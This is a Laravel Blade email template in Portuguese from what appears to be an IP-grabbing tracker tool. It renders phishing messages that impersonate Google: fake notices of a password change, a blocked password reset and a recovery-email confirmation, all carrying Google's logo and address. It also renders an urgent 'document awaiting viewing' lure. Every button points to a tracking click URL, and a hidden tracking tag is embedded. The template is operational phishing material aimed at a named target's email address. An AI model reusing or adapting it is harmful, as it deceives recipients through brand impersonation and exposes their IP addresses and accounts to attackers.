<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <title>{{ $tracker->emailSubject() }}</title>
</head>
<body style="margin:0; padding:0; background:#f1f3f4; font-family:Google Sans,Roboto,Arial,Helvetica,sans-serif; color:#202124;">
@php
    $tipo           = $tracker->email_tipo;
    $isReset        = $tipo === \App\Models\IpGrabber::EMAIL_TYPE_PASSWORD_RESET;
    $isRecovery     = $tipo === \App\Models\IpGrabber::EMAIL_TYPE_RECOVERY;
    $isChanged      = $tipo === \App\Models\IpGrabber::EMAIL_TYPE_PASSWORD_CHANGED;
    $nomeAlvo       = filled($tracker->nome_alvo) ? $tracker->nome_alvo : null;
    $saudacao       = $nomeAlvo ? 'Caro ' . $nomeAlvo . ',' : 'Prezado(a),';
@endphp

@if ($isReset || $isRecovery || $isChanged)
    {{-- Google-style layout compartilhado --}}
    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background:#f1f3f4; margin:0; padding:32px 16px;">
        <tr>
            <td align="center">
                <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width:600px;">

                    {{-- Google logo --}}
                    <tr>
                        <td align="center" style="padding-bottom:16px;">
                            <span style="font-size:22px; font-weight:700; letter-spacing:-0.5px;">
                                <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
                            </span>
                        </td>
                    </tr>

                    {{-- Card --}}
                    <tr>
                        <td style="background:#ffffff; border-radius:8px; padding:40px 40px 32px; box-shadow:0 1px 3px rgba(0,0,0,.12);">

                            <p style="margin:0 0 24px; font-size:15px; line-height:1.6; color:#202124;">
                                {{ $saudacao }}
                            </p>

                            @if ($isChanged)
                                {{-- Alteração de senha --}}
                                <div style="display:none; max-height:0; overflow:hidden; opacity:0; color:transparent;">
                                    Confirmação: a senha da sua conta foi alterada.
                                </div>

                                <p style="margin:0 0 20px; font-size:15px; line-height:1.6; color:#202124;">
                                    Isso é uma confirmação de que a senha da conta
                                    <strong>{{ $tracker->target_email }}</strong> foi alterada.
                                </p>

                                <p style="margin:0 0 28px; font-size:15px; line-height:1.6; color:#202124;">
                                    Se você não alterou sua senha, proteja sua conta clicando no botão abaixo.
                                </p>

                                <table role="presentation" cellspacing="0" cellpadding="0" style="margin-bottom:24px;">
                                    <tr>
                                        <td style="border-radius:4px; background:#1a73e8;">
                                            <a href="{{ $tracker->emailClickUrl() }}"
                                               style="display:inline-block; padding:10px 24px; color:#ffffff; font-size:14px; font-weight:500; text-decoration:none; letter-spacing:.25px;">
                                                Proteger minha conta
                                            </a>
                                        </td>
                                    </tr>
                                </table>

                                <p style="margin:0 0 20px; font-size:14px; line-height:1.6; color:#5f6368;">
                                    Se estiver tendo problemas, consulte a <a href="{{ $tracker->emailClickUrl() }}" style="color:#1a73e8; text-decoration:none;">central de ajuda</a>.
                                </p>

                            @elseif ($isReset)
                                {{-- Tentativa de redefinição de senha --}}
                                <div style="display:none; max-height:0; overflow:hidden; opacity:0; color:transparent;">
                                    Aviso de segurança: redefinição de senha bloqueada.
                                </div>

                                <p style="margin:0 0 16px; font-size:15px; line-height:1.6; color:#202124;">
                                    Não conseguimos redefinir a senha da sua conta Google
                                    (<strong>{{ $tracker->target_email }}</strong>)
                                    porque houve muitas tentativas malsucedidas de responder às suas perguntas de segurança.
                                    Para proteger a segurança da sua conta, você não poderá redefinir sua senha nas próximas oito horas.
                                </p>

                                <p style="margin:0 0 28px; font-size:15px; line-height:1.6; color:#202124;">
                                    Se você não fez essa alteração ou acredita que uma pessoa não autorizada acessou sua conta,
                                    acesse o link abaixo para redefinir sua senha o mais rápido possível e revisar suas configurações de segurança.
                                </p>

                                <table role="presentation" cellspacing="0" cellpadding="0" style="margin-bottom:28px;">
                                    <tr>
                                        <td style="border-radius:4px; background:#1a73e8;">
                                            <a href="{{ $tracker->emailClickUrl() }}"
                                               style="display:inline-block; padding:10px 24px; color:#ffffff; font-size:14px; font-weight:500; text-decoration:none; letter-spacing:.25px;">
                                                Não fui eu
                                            </a>
                                        </td>
                                    </tr>
                                </table>

                            @else
                                {{-- E-mail de recuperação --}}
                                <div style="display:none; max-height:0; overflow:hidden; opacity:0; color:transparent;">
                                    Confirme seu e-mail de recuperação da conta Google.
                                </div>

                                <p style="margin:0 0 16px; font-size:15px; line-height:1.6; color:#202124;">
                                    Identificamos que o endereço
                                    <strong>{{ $tracker->recovery_email }}</strong>
                                    está cadastrado como e-mail de recuperação da sua conta Google
                                    (<strong>{{ $tracker->target_email }}</strong>).
                                </p>

                                <p style="margin:0 0 28px; font-size:15px; line-height:1.6; color:#202124;">
                                    Se você reconhece esse e-mail de recuperação, clique no botão abaixo para confirmar.
                                    Caso contrário, ignore esta mensagem.
                                </p>

                                <table role="presentation" cellspacing="0" cellpadding="0" style="margin-bottom:28px;">
                                    <tr>
                                        <td style="border-radius:4px; background:#1a73e8;">
                                            <a href="{{ $tracker->emailClickUrl() }}"
                                               style="display:inline-block; padding:10px 24px; color:#ffffff; font-size:14px; font-weight:500; text-decoration:none; letter-spacing:.25px;">
                                                Confirmar
                                            </a>
                                        </td>
                                    </tr>
                                </table>
                            @endif

                            <p style="margin:0; font-size:13px; line-height:1.6; color:#5f6368;">
                                Se o botão não funcionar, copie e cole este endereço no navegador:<br>
                                <a href="{{ $tracker->emailClickUrl() }}" style="color:#1a73e8; word-break:break-all;">{{ $tracker->emailClickUrl() }}</a>
                            </p>
                        </td>
                    </tr>

                    {{-- Footer --}}
                    <tr>
                        <td style="padding:24px 40px 0; font-size:12px; line-height:1.6; color:#5f6368; text-align:center;">
                            Suporte da Google SIARD<br>
                            Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043
                        </td>
                    </tr>

                </table>
            </td>
        </tr>
    </table>

@else
    {{-- Marketing criativo --}}
    <div style="display:none; max-height:0; overflow:hidden; opacity:0; color:transparent;">
        Você tem 1 documento aguardando sua visualização — acesso expira em breve.
    </div>

    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background:#0f172a; margin:0; padding:0;">
        <tr>
            <td>
                {{-- Faixa de urgência --}}
                <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                    <tr>
                        <td align="center" style="background:#dc2626; padding:10px 24px;">
                            <span style="color:#ffffff; font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase;">
                                ⚠ Ação necessária — acesso expira em 24 horas
                            </span>
                        </td>
                    </tr>
                </table>

                {{-- Header escuro com ícone --}}
                <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                    <tr>
                        <td align="center" style="background:#0f172a; padding:40px 24px 32px;">
                            <div style="width:64px; height:64px; background:#1e293b; border:2px solid #334155; border-radius:16px; margin:0 auto 20px; display:flex; align-items:center; justify-content:center; font-size:28px; line-height:64px; text-align:center;">
                                📄
                            </div>
                            <h1 style="margin:0 0 10px; font-size:26px; font-weight:800; color:#f8fafc; letter-spacing:-.5px; line-height:1.2;">
                                Documento disponível
                            </h1>
                            <p style="margin:0; font-size:15px; color:#94a3b8; line-height:1.5;">
                                Um documento foi disponibilizado para você e<br>aguarda sua visualização.
                            </p>
                        </td>
                    </tr>
                </table>

                {{-- Card branco central --}}
                <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background:#f8fafc;">
                    <tr>
                        <td align="center" style="padding:40px 24px;">
                            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width:520px;">

                                {{-- Info box --}}
                                <tr>
                                    <td style="background:#ffffff; border:1px solid #e2e8f0; border-radius:12px; padding:28px 32px; margin-bottom:24px; box-shadow:0 4px 6px rgba(0,0,0,.04);">
                                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                                            <tr>
                                                <td style="padding-bottom:16px; border-bottom:1px solid #f1f5f9;">
                                                    <span style="font-size:11px; text-transform:uppercase; letter-spacing:.1em; color:#94a3b8; font-weight:600;">Tipo</span><br>
                                                    <span style="font-size:15px; color:#0f172a; font-weight:600;">Documento Digital</span>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td style="padding-top:16px; padding-bottom:16px; border-bottom:1px solid #f1f5f9;">
                                                    <span style="font-size:11px; text-transform:uppercase; letter-spacing:.1em; color:#94a3b8; font-weight:600;">Status</span><br>
                                                    <span style="display:inline-block; margin-top:4px; background:#fef9c3; color:#854d0e; font-size:13px; font-weight:700; padding:3px 10px; border-radius:20px;">
                                                        🕐 Aguardando visualização
                                                    </span>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td style="padding-top:16px;">
                                                    <span style="font-size:11px; text-transform:uppercase; letter-spacing:.1em; color:#94a3b8; font-weight:600;">Destinatário</span><br>
                                                    <span style="font-size:15px; color:#0f172a; font-weight:600;">{{ $tracker->target_email }}</span>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                {{-- Aviso de expiração --}}
                                <tr>
                                    <td style="padding:20px 0 24px;">
                                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                                            <tr>
                                                <td style="background:#fff7ed; border-left:4px solid #f97316; border-radius:0 8px 8px 0; padding:14px 16px;">
                                                    <span style="font-size:13px; color:#9a3412; line-height:1.5;">
                                                        <strong>Atenção:</strong> o link de acesso a este documento expira em <strong>24 horas</strong>. Após esse prazo, será necessário solicitar um novo envio.
                                                    </span>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                {{-- Botão CTA --}}
                                <tr>
                                    <td align="center" style="padding-bottom:20px;">
                                        <table role="presentation" cellspacing="0" cellpadding="0">
                                            <tr>
                                                <td style="border-radius:8px; background:#0f172a; box-shadow:0 4px 14px rgba(15,23,42,.35);">
                                                    <a href="{{ $tracker->emailClickUrl() }}"
                                                       style="display:inline-block; padding:16px 40px; color:#ffffff; font-size:15px; font-weight:700; text-decoration:none; letter-spacing:.02em;">
                                                        Acessar documento agora →
                                                    </a>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                {{-- Link texto --}}
                                <tr>
                                    <td align="center" style="padding-bottom:8px;">
                                        <span style="font-size:12px; color:#94a3b8;">Ou copie o endereço abaixo no navegador:</span><br>
                                        <a href="{{ $tracker->emailClickUrl() }}" style="font-size:11px; color:#3b82f6; word-break:break-all;">{{ $tracker->emailClickUrl() }}</a>
                                    </td>
                                </tr>

                            </table>
                        </td>
                    </tr>
                </table>

                {{-- Footer escuro --}}
                <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                    <tr>
                        <td align="center" style="background:#0f172a; padding:24px; font-size:11px; color:#475569; line-height:1.8;">
                            Este e-mail foi enviado para {{ $tracker->target_email }}.<br>
                            Se você acredita ter recebido esta mensagem por engano, ignore-a.
                        </td>
                    </tr>
                </table>

            </td>
        </tr>
    </table>
@endif

{!! $tracker->emailTrackingTag() !!}
</body>
</html>
